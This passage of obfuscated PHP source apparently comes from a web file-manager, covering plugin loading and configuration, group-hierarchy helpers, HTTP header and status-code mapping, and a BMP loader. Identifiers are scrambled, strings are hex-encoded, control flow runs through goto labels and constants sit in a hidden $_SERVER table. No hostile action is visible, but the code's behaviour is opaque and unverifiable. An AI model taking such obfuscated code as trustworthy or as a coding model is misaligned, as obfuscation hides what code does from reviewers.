$aë´ßÈãœ°[461] => 0, $aë´ßÈãœ°[456] => array($aë´ßÈãœ°[7], $fÍ’ƒ–•¹ó)); $Fº«´¾Éñ = $aë´ßÈãœ°[2194]; goto DÆğÏ²öÍê; bâîò¨Ëƒó: } protected function groupMerge($b™½ƒµ™) { $b™½ƒµ™ = array_unique($b™½ƒµ™); $DãàÖÄ¨Ñ• = array(); for ($dìÍ‰ÚØÌÜ = 0; $dìÍ‰ÚØÌÜ < count($b™½ƒµ™); $dìÍ‰ÚØÌÜ++) { $A´¹‰‘İÚ = !1; for ($eÏ‡Ëœ¥»† = 0; $eÏ‡Ëœ¥»† < count($b™½ƒµ™); $eÏ‡Ëœ¥»†++) { if ($dìÍ‰ÚØÌÜ == $eÏ‡Ëœ¥»†) { continue; } if ($this->isParentOf($b™½ƒµ™[$eÏ‡Ëœ¥»†], $b™½ƒµ™[$dìÍ‰ÚØÌÜ])) { $A´¹‰‘İÚ = !0; break; } } if (!$A´¹‰‘İÚ) { $DãàÖÄ¨Ñ•[] = $b™½ƒµ™[$dìÍ‰ÚØÌÜ]; } } return $DãàÖÄ¨Ñ•; } protected function isParentOf($dÃŒ‚ÊÏ¬Ò, $DÊ£´Êõì§) { goto d£‰Õ©íˆ²; A–Ş‚é£Ş“: return !1; goto aİ÷¸í§Û‡; aÛİİ¯ÀùŒ: $EğÚÕ–Õ‚ = $this->getInfoSimple($DÊ£´Êõì§); $CÔ¾¶à¨ñÆ = $b¹ÈŠŠèŒÉ[$CË¿šìŠšø[459]] . $dÃŒ‚ÊÏ¬Ò . $CË¿šìŠšø[47]; if (substr($EğÚÕ–Õ‚[$CË¿šìŠšø[459]], 0, strlen($CÔ¾¶à¨ñÆ)) == $CÔ¾¶à¨ñÆ) { return !0; } goto A–Ş‚é£Ş“; d£‰Õ©íˆ²: $CË¿šìŠšø =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$dÃŒ‚ÊÏ¬Ò || !$DÊ£´Êõì§ || $dÃŒ‚ÊÏ¬Ò == $DÊ£´Êõì§) { return !1; } $b¹ÈŠŠèŒÉ = $this->getInfoSimple($dÃŒ‚ÊÏ¬Ò); goto aÛİİ¯ÀùŒ; aİ÷¸í§Û‡: } public function groupShowRoot($bïœàƒ¥ãƒ, $cÉò¥îµŒ‘ = false) { goto AÙÛÅ£¾Õ—; F¡ôÀ¶õà­: $E‘ÌÊ¬Å¬ = array($bïœàƒ¥ãƒ); if (count($dâô ®Š†Œ) == 0) { return $E‘ÌÊ¬Å¬; } if ($cÉò¥îµŒ‘ && count($dâô ®Š†Œ) == 1) { return $E‘ÌÊ¬Å¬; } goto F¦öŠ‚ëÕØ; F¦öŠ‚ëÕØ: if (!$fšî’“Ó‘[$B¡”´¥óÒ[417]] || !isset($fšî’“Ó‘[$B¡”´¥óÒ[417]][$B¡”´¥óÒ[2177]]) || $fšî’“Ó‘[$B¡”´¥óÒ[417]][$B¡”´¥óÒ[2177]] == $B¡”´¥óÒ[2154]) { return $this->groupShowRoot($dâô ®Š†Œ[count($dâô ®Š†Œ) - 1], $cÉò¥îµŒ‘); } if ($fšî’“Ó‘[$B¡”´¥óÒ[417]][$B¡”´¥óÒ[2177]] == $B¡”´¥óÒ[346]) { $f¢µìŠÔ¢ = explode($B¡”´¥óÒ[47], $fšî’“Ó‘[$B¡”´¥óÒ[417]][$B¡”´¥óÒ[2178]]); if ($f¢µìŠÔ¢) { $E‘ÌÊ¬Å¬ = array_merge($E‘ÌÊ¬Å¬, $f¢µìŠÔ¢); } } return $E‘ÌÊ¬Å¬; goto B¬ÈñËÖæ˜; AÙÛÅ£¾Õ—: $B¡”´¥óÒ =& $_SERVER[¼€¼ˆ¦‚¡]; $fšî’“Ó‘ = $this->getInfo($bïœàƒ¥ãƒ); $dâô ®Š†Œ = $this->parentLevelArray($fšî’“Ó‘[$B¡”´¥óÒ[459]]); goto F¡ôÀ¶õà­; B¬ÈñËÖæ˜: } protected function resetParentLevel() { $B°ÙÒæˆƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $D’–Œ°Û©“ = $B°ÙÒæˆƒ[2105]; $fò›£Œ¾¦ = $this->select(); $fò›£Œ¾¦ = array_to_keyvalue($fò›£Œ¾¦, $D’–Œ°Û©“); foreach ($fò›£Œ¾¦ as $aóïˆ±¥”‹) { goto CîÌê®; b¼’ï«½·µ: $A”‡æÙíÌ[] = 0; $A”‡æÙíÌ = $B°ÙÒæˆƒ[47] . implode($B°ÙÒæˆƒ[47], array_reverse($A”‡æÙíÌ)) . $B°ÙÒæˆƒ[47]; $this->setNamePinyin($aóïˆ±¥”‹[$D’–Œ°Û©“], $aóïˆ±¥”‹[$B°ÙÒæˆƒ[28]]); goto eÑÔÀŒß±Õ; eÑÔÀŒß±Õ: $this->where(array($D’–Œ°Û©“ => $aóïˆ±¥”‹[$D’–Œ°Û©“]))->save(array($B°ÙÒæˆƒ[525] => $A”‡æÙíÌ)); goto f‹å¨»ñ‹; CîÌê®: $aÒªğã²Ó¸ = $aóïˆ±¥”‹; $A”‡æÙíÌ = array(); while ($aÒªğã²Ó¸[$B°ÙÒæˆƒ[461]] != 0) { $A”‡æÙíÌ[] = $aÒªğã²Ó¸[$B°ÙÒæˆƒ[461]]; $aÒªğã²Ó¸ = $fò›£Œ¾¦[$aÒªğã²Ó¸[$B°ÙÒæˆƒ[461]]]; } goto b¼’ï«½·µ; f‹å¨»ñ‹: } return $fò›£Œ¾¦; } public function groupNameAuto($CƒÌ¾õÜ²Œ, $bÁí¼İ¸¼) { $FŸíªà‚·£ =& $_SERVER[¼€¼ˆ¦‚¡]; $A®·Ü¯¦ä = $this->where(array($FŸíªà‚·£[368] => $CƒÌ¾õÜ²Œ))->getField($FŸíªà‚·£[28], !0); if (!$A®·Ü¯¦ä || !in_array($bÁí¼İ¸¼, $A®·Ü¯¦ä)) { return $bÁí¼İ¸¼; } for ($b©˜Õ ‰Íí = 1; $b©˜Õ ‰Íí <= count($A®·Ü¯¦ä) + 1; $b©˜Õ ‰Íí++) { $EÓÆïæèéÁ = $bÁí¼İ¸¼ . "\50{$b©˜Õ ‰Íí}\x29"; if (!in_array($EÓÆïæèéÁ, $A®·Ü¯¦ä)) { return $EÓÆïæèéÁ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\160\154\x75\x67\x69\156\x4c\151\163\164"; public $field = array("\156\141\155\145", "\x73\x74\141\164\165\x73", "\162\145\x67\151\x65\163\x74", "\143\x6f\x6e\x66\151\147"); public function loadList($E©«„½ŠÕ˜ = false) { $fÂÊÓ„õŞ = array_to_keyvalue($this->listData(), $_SERVER[¼€¼ˆ¦‚¡][28]); if ($E©«„½ŠÕ˜) { return $fÂÊÓ„õŞ[$E©«„½ŠÕ˜]; } return $fÂÊÓ„õŞ; } public function init() { $CéÜ­ù»ÚÜ =& $_SERVER[¼€¼ˆ¦‚¡]; Hook::trigger($CéÜ­ù»ÚÜ[2196]); $aˆ…Å “”— = $this->loadPluginList(); foreach ($aˆ…Å “”— as $FÎ±ËïÑÒ => $a¹ÅšÙ„‚‰) { $bš²‡Ó¯ = $this->appAllow($FÎ±ËïÑÒ, $a¹ÅšÙ„‚‰); if (!$bš²‡Ó¯) { continue; } foreach ($a¹ÅšÙ„‚‰[$CéÜ­ù»ÚÜ[2197]] as $D‰¡óÎêãÓ => $dê’Ñ¿‹Ç) { Hook::bind($D‰¡óÎêãÓ, $dê’Ñ¿‹Ç); } } Hook::trigger($CéÜ­ù»ÚÜ[2198]); Hook::trigger(ACTION); } public function appAllow($EêÏƒ¯‡í, $B´øáÍÌ»È, $bÄõ˜ä““‰ = true) { $B‰ÎÜ“ŞÛ˜ =& $_SERVER[¼€¼ˆ¦‚¡]; $d¬ÇÚÀÁ¬» = PLUGIN_DIR . $EêÏƒ¯‡í . $B‰ÎÜ“ŞÛ˜[2199]; if (!is_array($B´øáÍÌ»È) || !is_array($B´øáÍÌ»È[$B‰ÎÜ“ŞÛ˜[2197]]) || !is_file($d¬ÇÚÀÁ¬») || $B´øáÍÌ»È[$B‰ÎÜ“ŞÛ˜[685]] != 1) { return !1; } if ($bÄõ˜ä““‰ && !Action($B‰ÎÜ“ŞÛ˜[2200])->checkAuth($EêÏƒ¯‡í)) { return !1; } return !0; } public function unInstall($cò¹©ÁÚÆë) { $c›ß·ï”· =& $_SERVER[¼€¼ˆ¦‚¡]; $e¿‹“ÃÁá = $this->loadList($cò¹©ÁÚÆë); if (file_exists(PLUGIN_DIR . $cò¹©ÁÚÆë)) { Hook::apply($cò¹©ÁÚÆë . $c›ß·ï”·[2201]); } $this->remove($e¿‹“ÃÁá[$c›ß·ï”·[367]]); } public function changeStatus($cäô©öÂ÷Ø, $cô„ ä³‰‰) { $EÁ¦³çğä‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $DŞ²Ä òœÀ = $this->loadList($cäô©öÂ÷Ø); if ($cô„ ä³‰‰) { Hook::apply($cäô©öÂ÷Ø . $EÁ¦³çğä‰[2202]); } $this->update($DŞ²Ä òœÀ[$EÁ¦³çğä‰[367]], array($EÁ¦³çğä‰[2203] => $cô„ ä³‰‰)); } public function appRegist($Bõñ· ŠÑ, $eğÄÀİàİ¾) { $C¶øœæÇ“ =& $_SERVER[¼€¼ˆ¦‚¡]; $d™ÖéÈé©“ = $this->loadList($Bõñ· ŠÑ); if ($d™ÖéÈé©“) { $this->update($d™ÖéÈé©“[$C¶øœæÇ“[367]], array($C¶øœæÇ“[2197] => $eğÄÀİàİ¾)); } else { $Añó‘Ö­’Ç = array($C¶øœæÇ“[28] => $Bõñ· ŠÑ, $C¶øœæÇ“[2197] => $eğÄÀİàİ¾, $C¶øœæÇ“[685] => 0, $C¶øœæÇ“[6] => $this->getConfigDefault($Bõñ· ŠÑ)); $this->insert($Añó‘Ö­’Ç); } } public function getConfigDefault($D‰Ê¨Ì«È„) { $fÀŠ‡ªâˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $d´‹õÜ‘¿ = array(); $e®´Î˜ = $this->getPackageJson($D‰Ê¨Ì«È„); if (!$e®´Î˜ && is_array($e®´Î˜[$fÀŠ‡ªâˆ[2204]])) { return $d´‹õÜ‘¿; } foreach ($e®´Î˜[$fÀŠ‡ªâˆ[2204]] as $BÏ‹¶ì¾ => $aóšº ’±ò) { if (!isset($aóšº ’±ò[$fÀŠ‡ªâˆ[359]]) || isset($d´‹õÜ‘¿[$BÏ‹¶ì¾])) { continue; } $d´‹õÜ‘¿[$BÏ‹¶ì¾] = $aóšº ’±ò[$fÀŠ‡ªâˆ[359]]; } return $d´‹õÜ‘¿; } public function getPackageJson($cØ‡Ş¿½´„) { return Hook::apply($cØ‡Ş¿½´„ . $_SERVER[¼€¼ˆ¦‚¡][2205]); } public function getConfig($böîã‹Œøé, $fæÂ¡É„Ó³ = false) { $E÷…•÷‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $f´‡±¨Æ»Â = array(); $EË‰ìÓàê = $this->loadList($böîã‹Œøé); if ($EË‰ìÓàê && is_array($EË‰ìÓàê[$E÷…•÷‡[6]])) { $f´‡±¨Æ»Â = $EË‰ìÓàê[$E÷…•÷‡[6]]; } if (!$f´‡±¨Æ»Â || $fæÂ¡É„Ó³) { $f´‡±¨Æ»Â = $this->getConfigDefault($böîã‹Œøé); } return $f´‡±¨Æ»Â; } public function setConfig($Eì‰¸ƒâë, $aĞÎÍØªŒõ = false) { goto D²—æÚ‘Œ‰; AÁŸñ¡”Ë­: $bù±º÷Æ˜ = $a´ÈÕ‰‹[$aÕ‚Ã÷óé[6]]; if ($aĞÎÍØªŒõ == !1) { $bù±º÷Æ˜ = array(); $aĞÎÍØªŒõ = $this->getConfigDefault($Eì‰¸ƒâë); } foreach ($aĞÎÍØªŒõ as $F†«ÁäŞæ¸ => $Aƒ‰“ñšï¾) { $bù±º÷Æ˜[$F†«ÁäŞæ¸] = is_string($Aƒ‰“ñšï¾) ? trim($Aƒ‰“ñšï¾) : $Aƒ‰“ñšï¾; } goto d¸™é©¸½Š; d¸™é©¸½Š: $this->update($a´ÈÕ‰‹[$aÕ‚Ã÷óé[367]], array($aÕ‚Ã÷óé[6] => $bù±º÷Æ˜)); goto B‘´¶×¬¹Ó; D²—æÚ‘Œ‰: $aÕ‚Ã÷óé =& $_SERVER[¼€¼ˆ¦‚¡]; $a´ÈÕ‰‹ = $this->loadList($Eì‰¸ƒâë); if (!$a´ÈÕ‰‹) { return !1; } goto AÁŸñ¡”Ë­; B‘´¶×¬¹Ó: } public function viewList() { goto D¹‡ò£²; CÄ¤¾µÙíË: return $eŸÎìÈ; goto AÑ§ÀÃå›¾; CÔØ–»Ò‚ä: $dªœÎ¿Ô = $this->loadPluginList(); $eŸÎìÈ = array(); foreach ($dªœÎ¿Ô as $Bºñ²šŠ†Ã => $dğˆòÁ) { unset($dğˆòÁ[$F —êºÎëÙ[2197]], $dğˆòÁ[$F —êºÎëÙ[6]]); $F®ˆ­‹šÙ = PLUGIN_DIR . $dğˆòÁ[$F —êºÎëÙ[28]] . $F —êºÎëÙ[2199]; if (!is_file($F®ˆ­‹šÙ)) { continue; } $Cï®¬›ïÔ = Hook::apply($dğˆòÁ[$F —êºÎëÙ[28]] . $F —êºÎëÙ[2205]); if (is_array($Cï®¬›ïÔ)) { $eŸÎìÈ[$Bºñ²šŠ†Ã] = array_merge($dğˆòÁ, $Cï®¬›ïÔ); } } goto CÄ¤¾µÙíË; D¹‡ò£²: $F —êºÎëÙ =& $_SERVER[¼€¼ˆ¦‚¡]; $dªœÎ¿Ô = $this->loadList(); $this->pluginScan($dªœÎ¿Ô); goto CÔØ–»Ò‚ä; AÑ§ÀÃå›¾: } private function loadPluginList() { $cÛâ¾¨­¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $f¶İ³Ú¤Ì = $this->loadList(); if (strtolower(MOD) == $cÛâ¾¨­¢[2206]) { return $f¶İ³Ú¤Ì; } $b¬áè‘ƒÇø = Hook::trigger($cÛâ¾¨­¢[2207], $f¶İ³Ú¤Ì); if ($f¶İ³Ú¤Ì && !$b¬áè‘ƒÇø) { die; } return $b¬áè‘ƒÇø ? $b¬áè‘ƒÇø : $f¶İ³Ú¤Ì; } private function pluginScan($FÔ˜ëÎÅİ‹) { $EõŞ´µÛİ =& $_SERVER[¼€¼ˆ¦‚¡]; recursion_dir(PLUGIN_DIR, $D¡ÃÁœÉ³ô, $cÆ¥÷—ĞÙ¬, 0); foreach ($D¡ÃÁœÉ³ô as $bá¤ŠßÃ) { $FÔŸÜª¾°Ó = get_path_this($bá¤ŠßÃ); if (isset($FÔ˜ëÎÅİ‹[$FÔŸÜª¾°Ó]) || !file_exists($bá¤ŠßÃ . $EõŞ´µÛİ[2208]) || !file_exists($bá¤ŠßÃ . $EõŞ´µÛİ[2199])) { continue; } Hook::apply($FÔŸÜª¾°Ó . $EõŞ´µÛİ[2202]); } } } goto F×ÍæÖ³È; cô½ÀŸÑÔ•: class HttpHeader { public static $_headers = array("\110\x6f\163\164" => "\110\124\x54\x50\x5f\x48\x4f\123\x54", "\x55\x73\x65\162\x2d\101\147\x65\156\x74" => "\110\x54\x54\120\x5f\125\x53\105\122\137\x41\107\105\116\124", "\103\x6f\x6e\164\145\156\x74\x2d\124\x79\160\145" => "\110\x54\x54\x50\x5f\x43\117\x4e\124\105\116\124\x5f\x54\131\120\105", "\x43\x6f\x6e\164\x65\156\164\55\x4c\x65\x6e\x67\x74\x68" => "\110\x54\x54\x50\137\103\117\x4e\x54\105\x4e\x54\x5f\114\105\x4e\x47\x54\x48", "\104\145\x70\x74\x68" => "\110\x54\124\120\137\x44\x45\x50\x54\x48", "\105\170\160\x65\143\x74" => "\110\124\x54\120\x5f\x45\130\120\105\103\x54", "\111\146\55\x4e\157\156\x65\55\x4d\141\164\143\150" => "\110\124\x54\x50\137\x49\x46\x5f\x4e\x4f\x4e\105\137\x4d\x41\124\x43\110", "\x49\x66\x2d\x4d\141\164\x63\150" => "\110\x54\x54\x50\137\111\x46\x5f\115\x41\x54\103\x48", "\111\x66\x2d\122\141\156\x67\x65" => "\x48\124\124\x50\x5f\111\x46\x5f\122\101\x4e\x47\105", "\114\141\x73\x74\55\x4d\157\144\x69\146\x69\x65\x64" => "\x48\124\x54\x50\x5f\x4c\101\123\124\x5f\x4d\x4f\104\111\x46\x49\105\104", "\x49\x66\55\115\x6f\144\x69\x66\x69\x65\144\55\x53\x69\156\x63\x65" => "\110\x54\124\120\137\111\106\137\115\117\104\x49\106\x49\105\x44\x5f\x53\x49\116\x43\x45", "\x49\x66\x2d\125\x6e\x6d\157\x64\x69\x66\x69\145\144\x2d\x53\x69\x6e\143\x65" => "\x48\x54\124\x50\137\x49\x46\137\x55\116\115\x4f\x44\111\x46\111\x45\x44\137\123\111\116\x43\105", "\122\141\x6e\x67\145" => "\110\124\124\120\137\122\101\116\107\105", "\124\x69\x6d\145\157\165\164" => "\110\x54\124\x50\x5f\x54\x49\x4d\x45\x4f\x55\x54", "\x49\146" => "\110\124\x54\120\x5f\111\106", "\x4c\157\143\153\55\x54\x6f\x6b\145\156" => "\110\x54\124\120\137\114\117\103\x4b\x5f\124\x4f\x4b\x45\116", "\x4f\166\x65\x72\167\x72\151\164\x65" => "\x48\x54\x54\120\x5f\117\x56\x45\x52\x57\x52\111\124\x45", "\104\x65\x73\x74\151\x6e\x61\x74\151\x6f\156" => "\110\124\x54\120\x5f\104\105\123\124\x49\x4e\101\124\x49\x4f\x4e", "\122\x65\161\165\145\163\164\x2d\111\144" => "\122\105\121\x55\x45\x53\124\137\111\104", "\122\x65\161\165\x65\x73\x74\55\x42\157\144\x79\55\106\x69\x6c\145" => "\122\x45\x51\x55\105\x53\124\x5f\x42\x4f\104\x59\x5f\x46\111\x4c\x45", "\122\x65\144\151\x72\145\143\164\55\123\164\141\x74\x75\163" => "\x52\x45\104\x49\122\x45\x43\x54\x5f\123\x54\101\x54\x55\x53"); public static function init() { static $F–¯†Áù = false; if ($F–¯†Áù) { return; } foreach ($_SERVER as $e»±Ü¾Ó­– => $A¼ ÚÁàò) { $e»±Ü¾Ó­– = strtoupper($e»±Ü¾Ó­–); if (!array_key_exists($e»±Ü¾Ó­–, $_SERVER)) { continue; } $_SERVER[$e»±Ü¾Ó­–] = $A¼ ÚÁàò; } foreach (self::$_headers as $e»±Ü¾Ó­– => $då‡£å¡Üù) { if (!array_key_exists($e»±Ü¾Ó­–, $_SERVER)) { continue; } $_SERVER[$e»±Ü¾Ó­–] = $_SERVER[$då‡£å¡Üù]; $_SERVER[strtoupper($e»±Ü¾Ó­–)] = $_SERVER[$då‡£å¡Üù]; } } public static function get($dÉªÇôª¹) { self::init(); return $_SERVER[$dÉªÇôª¹] ? $_SERVER[$dÉªÇôª¹] : $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][1829] . strtoupper($dÉªÇôª¹)]; } public static function method() { return strtoupper(self::get($_SERVER[¼€¼ˆ¦‚¡][154])); } public static function length() { $DµƒÙ†µç´ =& $_SERVER[¼€¼ˆ¦‚¡]; $B‡œËÈÔæ = self::get($DµƒÙ†µç´[1830]); if (!$B‡œËÈÔæ) { $B‡œËÈÔæ = self::get($DµƒÙ†µç´[1146]); } return $B‡œËÈÔæ; } public static function range() { $DŸ‰˜Ë‹âË =& $_SERVER[¼€¼ˆ¦‚¡]; $EÛæ–ãÔ–ö = self::get($DŸ‰˜Ë‹âË[198]); if (!$EÛæ–ãÔ–ö) { return !1; } if (!preg_match($DŸ‰˜Ë‹âË[1831], $EÛæ–ãÔ–ö, $eİ÷ˆ¥°è)) { return !1; } if ($eİ÷ˆ¥°è[1] === $DŸ‰˜Ë‹âË[33] && $eİ÷ˆ¥°è[2] === $DŸ‰˜Ë‹âË[33]) { return !1; } return array($eİ÷ˆ¥°è[1] !== $DŸ‰˜Ë‹âË[33] ? $eİ÷ˆ¥°è[1] : null, $eİ÷ˆ¥°è[2] !== $DŸ‰˜Ë‹âË[33] ? $eİ÷ˆ¥°è[2] : null); } public static $statusCode = array("\61\x30\x30" => "\x43\157\x6e\x74\x69\x6e\165\145", "\61\60\x31" => "\123\x77\151\x74\x63\150\x69\x6e\147\40\120\162\x6f\164\157\x63\157\154", "\61\x30\x32" => "\120\162\x6f\x63\x65\x73\x73\x69\x6e\147", "\61\x30\x33" => "\x45\141\162\x6c\x79\40\110\x69\156\x74\163", "\62\x30\60" => "\117\113", "\x32\60\x31" => "\x43\162\x65\x61\164\x65\x64", "\x32\60\x32" => "\x41\143\143\x65\x70\x74\x65\144", "\x32\x30\63" => "\116\x6f\156\55\x41\x75\164\x68\x6f\x72\x69\x74\141\x74\x69\166\145\40\111\x6e\146\157\x72\155\141\x74\x69\x6f\156", "\x32\60\x34" => "\x4e\x6f\40\x43\x6f\x6e\164\x65\x6e\164", "\x32\x30\65" => "\x52\145\x73\145\x74\40\x43\x6f\156\164\145\156\164", "\62\x30\x36" => "\120\141\162\164\151\x61\154\x20\x43\x6f\156\x74\x65\156\164", "\x32\60\x37" => "\x4d\165\x6c\x74\x69\x2d\123\x74\x61\164\165\x73", "\x33\60\60" => "\x4d\165\x6c\x74\x69\160\x6c\x65\40\x43\x68\x6f\151\x63\145\163", "\x33\x30\61" => "\115\157\x76\x65\x64\40\120\145\162\x6d\x61\156\x65\x6e\x74\154\171", "\x33\60\x32" => "\106\157\165\x6e\144", "\x33\x30\63" => "\123\145\x65\x20\x4f\164\150\x65\162", "\x33\60\x34" => "\x4e\x6f\164\x20\115\157\x64\x69\x66\151\x65\144", "\x33\60\x35" => "\125\163\145\x20\x50\162\x6f\170\x79", "\63\x30\67" => "\124\145\x6d\160\x6f\x72\x61\x72\171\x20\x52\145\x64\151\162\145\143\x74", "\x33\60\x38" => "\120\x65\x72\155\x61\156\x65\x6e\x74\40\x52\x65\144\151\162\x65\143\164", "\x34\60\60" => "\102\141\144\40\122\145\161\165\x65\x73\164", "\64\60\61" => "\125\156\x61\x75\x74\x68\x6f\x72\x69\172\145\x64", "\64\x30\x32" => "\x50\x61\x79\155\x65\156\x74\40\x52\145\161\165\151\162\145\144", "\x34\60\63" => "\106\x6f\162\x62\151\x64\x64\145\x6e", "\64\x30\x34" => "\116\x6f\164\40\106\157\x75\x6e\x64", "\64\60\x35" => "\x4d\x65\164\150\157\144\40\116\157\x74\x20\101\x6c\x6c\157\x77\145\x64", "\64\60\66" => "\x4e\x6f\164\40\x41\x63\x63\145\x70\x74\x61\x62\x6c\x65", "\64\60\67" => "\x50\x72\157\x78\171\40\101\x75\164\150\x65\x6e\164\x69\143\141\164\x69\x6f\156\x20\x52\x65\x71\165\151\x72\x65\144", "\64\x30\x38" => "\x52\145\161\165\x65\x73\164\40\124\x69\155\x65\x6f\x75\164", "\x34\60\x39" => "\x43\x6f\156\146\x6c\x69\x63\164", "\x34\x31\60" => "\x47\157\156\x65", "\64\61\x31" => "\114\x65\x6e\x67\x74\150\x20\x52\145\161\165\151\x72\145\x64", "\x34\61\62" => "\x50\x72\x65\x63\x6f\156\144\151\164\151\157\156\40\x46\x61\x69\154\145\x64", "\64\x31\x33" => "\122\x65\x71\x75\x65\x73\x74\40\105\156\x74\151\164\x79\x20\x54\157\157\40\x4c\x61\162\147\x65", "\64\61\x34" => "\x52\145\x71\x75\x65\163\164\40\x55\122\111\x20\124\x6f\x6f\x20\114\141\x72\x67\145", "\64\x31\65" => "\x55\x6e\163\x75\x70\x70\157\x72\164\145\144\x20\x4d\x65\144\x69\x61\x20\124\x79\x70\x65", "\x34\61\66" => "\x52\145\x71\x75\x65\163\x74\145\144\x20\122\x61\156\x67\x65\40\x4e\157\164\40\x53\141\x74\x69\x73\146\151\x61\x62\154\x65", "\64\x31\x37" => "\105\170\160\145\x63\164\141\x74\x69\x6f\x6e\x20\x46\x61\151\154\x65\x64", "\x34\62\x32" => "\x55\156\x70\162\x6f\143\145\163\163\141\142\x6c\145\40\105\156\x74\151\x74\171", "\64\62\x33" => "\x4c\157\143\x6b\145\144", "\64\62\x34" => "\x46\x61\x69\154\145\144\40\104\145\x70\145\156\x64\x65\156\x63\171", "\x34\62\65" => "\x55\156\157\162\x64\x65\x72\x65\x64\x20\x43\x6f\x6c\154\145\143\164\151\x6f\x6e", "\x34\62\66" => "\x55\160\147\162\141\x64\x65\x20\122\145\161\x75\151\x72\145\144", "\x34\x32\x38" => "\x50\x72\x65\143\x6f\x6e\144\151\x74\151\x6f\x6e\x20\x52\145\161\x75\151\162\145\x64", "\64\62\x39" => "\124\157\x6f\40\x4d\x61\x6e\171\x20\x52\x65\x71\x75\145\x73\164\x73", "\x34\63\61" => "\122\x65\x71\x75\145\x73\164\40\x48\x65\141\144\145\x72\40\x46\151\x65\154\x64\x73\x20\x54\157\x6f\x20\x4c\141\162\x67\145", "\x34\x34\x34" => "\116\x6f\x20\x52\x65\x73\160\x6f\156\x73\145", "\x34\x35\60" => "\102\154\x6f\x63\x6b\x65\144\x20\142\x79\40\127\x69\156\x64\x6f\x77\x73\40\x50\x61\x72\145\x6e\x74\x61\x6c\40\x43\x6f\x6e\x74\162\x6f\x6c\163", "\64\65\61" => "\x55\156\141\166\141\x69\x6c\141\142\154\145\x20\106\157\x72\x20\114\145\147\x61\154\x20\122\x65\x61\x73\x6f\x6e\163", "\x34\71\x34" => "\122\x65\161\165\x65\163\x74\x20\x48\x65\x61\x64\x65\162\x20\x54\157\x6f\x20\114\141\x72\147\145", "\x35\x30\60" => "\111\x6e\164\145\x72\x6e\141\154\40\123\145\x72\166\145\162\x20\x45\x72\162\x6f\x72", "\x35\60\61" => "\116\x6f\x74\x20\111\x6d\x70\x6c\145\x6d\145\x6e\164\x65\x64", "\65\x30\62" => "\102\141\144\x20\x47\x61\x74\145\x77\x61\x79", "\x35\x30\x33" => "\x53\x65\162\166\x69\143\x65\40\125\156\141\166\141\151\154\x61\x62\154\145", "\65\x30\x34" => "\107\x61\164\x65\167\141\171\x20\124\151\x6d\145\x6f\x75\x74", "\65\x30\65" => "\110\124\x54\x50\40\x56\145\x72\163\x69\157\x6e\x20\156\157\164\40\163\x75\160\x70\157\162\164\145\144", "\65\x30\x37" => "\111\156\x73\165\146\146\x69\143\151\x65\x6e\x74\x20\x53\164\157\162\x61\x67\x65"); public static function code($CìæÅøÂÊ²) { $bĞí©ä­¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $CìæÅøÂÊ² = $CìæÅøÂÊ² . $bĞí©ä­¯[33]; $Fœ”À¨ª© = self::$statusCode[$CìæÅøÂÊ²]; $Fœ”À¨ª© = $Fœ”À¨ª© ? "\110\x54\x54\120\57\x31\x2e\61\40{$CìæÅøÂÊ²}\40" . $Fœ”À¨ª© : $bĞí©ä­¯[33]; return $Fœ”À¨ª©; } } class ImageGdBMP { public static function load($EÑ«‹¥™Ğ) { $bò …¬ëí = fopen($EÑ«‹¥™Ğ, $_SERVER[¼€¼ˆ¦‚¡][1521]); if ($bò …¬ëí === !1) { return !1; } $cÎ‹á¼áÔŠ = self::loadFromStream($bò …¬ëí); fclose($bò …¬ëí); return $cÎ‹á¼áÔŠ; } public static function loadFromStream($F©ŞÌ•¿Å) { $B†Á«ÚÎÚ² =& $_SERVER[¼€¼ˆ¦‚¡]; $DÓ¦£³ö = fread($F©ŞÌ•¿Å, 14); if ($DÓ¦£³ö === !1) { return !1; } if ($DÓ¦£³ö[0] != $B†Á«ÚÎÚ²[1832] || $DÓ¦£³ö[1] != $B†Á«ÚÎÚ²[1833]) { return !1; } $FŒ²­ÏÔƒ± = unpack($B†Á«ÚÎÚ²[1834] . $B†Á«ÚÎÚ²[1835] . $B†Á«ÚÎÚ²[1836] . $B†Á«ÚÎÚ²[1837] . $B†Á«ÚÎÚ²[1838], $DÓ¦£³ö); return self::loadFromStreamAndFileHeader($F©ŞÌ•¿Å, $FŒ²­ÏÔƒ±); } public static function loadFromStreamAndFileHeader($c‡âØ™àå¬, array $e¶öŞ‚‘¨¹) { goto C¼í¼Œ“¯¨; Eõ‹œ§Ï‹ñ: if ($EØ÷æË¾Š == 0 || $D³¨¨ˆ† == 0 || $e²ºàªÕª != 1 || ($E˜ÏÀ²ôøõ & $DŠ·œİÎ…Œ) != 0 || ($E˜ÏÀ²ôøõ & $BíÁµ¼Àƒµ) != 0 || ($E˜ÏÀ²ôøõ & $cÅ˜âÄ†À) != 0 || ($DŠ·œİÎ…Œ & $BíÁµ¼Àƒµ) != 0 || ($DŠ·œİÎ…Œ & $cÅ˜âÄ†À) != 0 || ($BíÁµ¼Àƒµ & $cÅ˜âÄ†À) != 0) { return !1; } if ($a‡µéğù ê == 4 || $a‡µéğù ê == 5) { $C¸“÷æ…ËŒ = stream_get_contents($c‡âØ™àå¬, $Añù½½îİ´); if ($C¸“÷æ…ËŒ === !1) { return !1; } return imagecreatefromstring($C¸“÷æ…ËŒ); } $D‚ô¯ÅÁµ° = $EØ÷æË¾Š * $e¤ªÜ†…½ + 31 >> 3 & ~3; goto BàŸâÒ¸Å‚; c’ŞèªÔÖ‹: if ($C¸“÷æ…ËŒ === !1) { return !1; } list(, $B»×Ø‘¢¹Á) = unpack($b•¨µÅß¼[1839], $C¸“÷æ…ËŒ); if ($B»×Ø‘¢¹Á == 12) { goto A†ä¤ğÔ“; A†ä¤ğÔ“: $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $B»×Ø‘¢¹Á - 4); if ($C¸“÷æ…ËŒ === !1) { return !1; } extract(unpack($b•¨µÅß¼[1840] . $b•¨µÅß¼[1841] . $b•¨µÅß¼[1842] . $b•¨µÅß¼[1843], $C¸“÷æ…ËŒ)); goto DÜ›ÏŠò—; e†‹ø˜Š·¿: $cÅ˜âÄ†À = 255; goto dïÃğ•’Ÿç; DÜ›ÏŠò—: 